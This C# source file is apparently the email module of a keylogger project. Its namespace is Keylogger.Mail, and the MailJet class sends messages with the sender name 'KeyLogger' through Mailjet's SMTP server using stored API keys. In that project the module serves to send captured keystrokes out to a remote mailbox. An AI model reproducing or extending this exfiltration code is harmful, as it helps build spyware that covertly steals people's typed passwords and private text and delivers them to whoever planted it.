using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger.Mail
{
    /// <summary>
    /// Represents mailjet.com provider for sending emails for free
    /// </summary>
    public class MailJet : IMailProvider
    {
        private string PublicKey;
        private string PrivateKey;




        public MailJet(string publicKey, string privateKey)
        {
            PublicKey = publicKey;
            PrivateKey = privateKey;
        }




        /// <summary>
        /// This function sends mail specified by arguments
        /// </summary>
        /// <param name="address">Recipient of the email</param>
        /// <param name="subject">Email's subject</param>
        /// <param name="message">Text of the email</param>
        public void SendMail(string address, string subject, string message)
        {
            using (SmtpClient client = new SmtpClient())
            using (MailMessage mail = new MailMessage(new MailAddress(address, "KeyLogger"), new MailAddress(address)))
            {
                client.Port = 587;
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(PublicKey, PrivateKey);
                client.Host = "in-v3.mailjet.com";
                client.SendCompleted += (sender, e) =>
                {
                    if (e.Error != null)
                        throw e.Error;
                };

                mail.Subject = subject;
                mail.Body = message;

                client.Send(mail);
            }
        }
    }
}
